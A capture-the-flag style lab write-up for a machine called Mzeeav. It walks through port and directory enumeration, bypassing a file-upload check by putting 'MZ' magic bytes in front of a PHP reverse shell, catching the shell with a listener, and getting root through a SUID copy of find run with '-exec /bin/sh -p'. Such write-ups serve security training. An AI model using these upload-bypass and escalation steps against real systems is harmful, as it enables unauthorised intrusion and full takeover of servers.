##### Tags: `find`  `MZ`  `4D5A`  `SUID`

# 🐧Mzeeav🐧
## Enumeration
Nmap
```console
$ nmap -p- -T4 -sV 192.168.195.33

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
port 80 is running MZEE-AV 2022 upload page  
gobuster found /upload and /backups directory
```console
$ gobuster dir -u http://192.168.195.33 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -b 302,404
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.195.33
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   302,404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/upload               (Status: 301) [Size: 317] [--> http://192.168.195.33/upload/]
/backups              (Status: 301) [Size: 318] [--> http://192.168.195.33/backups/]
```
there is a backup.zip file in /backups  
inside the zip file is a upload.php  
it tells us how the upload function works
```console
#check for the first two bytes of the file

$magic=fread($F,2);
```
```console
#If the first two bytes are MZ (the characters for a Windows Executable), bin2hex turns them into 4d5a.

$magicbytes = strtoupper(substr(bin2hex($magic),0,4));
```
```console
#If 4D5A is found: The script continues and renames your file to its original name (allowing the upload).

#If 4D5A is NOT found: It prints an error and exit() kills the process, deleting your file.

if ( strpos($magicbytes, '4D5A') === false )
```
since 4D5A is decode as MZ
we just have to add MZ to the beginning of the file we gonna upload  
we upload to burp suite and add MZ in a reverse shell script
```console
POST /upload.php HTTP/1.1
Host: 192.168.195.33
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://192.168.195.33/index.html
Content-Type: multipart/form-data; boundary=---------------------------89373620636478429291337044981
Content-Length: 5736
Origin: http://192.168.195.33
Connection: keep-alive
Priority: u=0

-----------------------------89373620636478429291337044981
Content-Disposition: form-data; name="file"; filename="php-reverse-shell.php"
Content-Type: application/x-php

MZ
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
```
```console
$ penelope -p 22            
[+] Listening for reverse shells on 0.0.0.0:22 →  127.0.0.1 • 10.0.2.15 • 192.168.45.167
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from mzeeav 192.168.195.33 Linux-x86_64 👤 www-data(33) • Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3
[+] Interacting with session [1] • Shell Type PTY • Menu key F12 ⇐
[+] Logging to /home/ming/.penelope/sessions/mzeeav~192.168.195.33-Linux-x86_64/2026_03_22-22_01_08-164.log
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
www-data@mzeeav:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
## Privilege Escalation
there is a file got SUID bit
```console
www-data@mzeeav:/opt$ find / -perm -4000 -type f 2>/dev/null
/opt/fileS

www-data@mzeeav:/opt$ ls -la /opt/fileS
---s--s--x 1 root root 311008 Nov 14  2023 /opt/fileS
```
search and found its actually find command in linux
```console
www-data@mzeeav:/opt$ /opt/fileS --help
Usage: /opt/fileS [-H] [-L] [-P] [-Olevel] [-D debugopts] [path...] [expression]

default path is the current directory; default expression is -print
expression may consist of: operators, options, tests, and actions:
operators (decreasing precedence; -and is implicit where no others are given):
      ( EXPR )   ! EXPR   -not EXPR   EXPR1 -a EXPR2   EXPR1 -and EXPR2
      EXPR1 -o EXPR2   EXPR1 -or EXPR2   EXPR1 , EXPR2
positional options (always true): -daystart -follow -regextype
```
https://gtfobins.org/gtfobins/find/#shell
```console
www-data@mzeeav:/opt$ /opt/fileS . -exec /bin/sh -p \; -quit
# id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
```
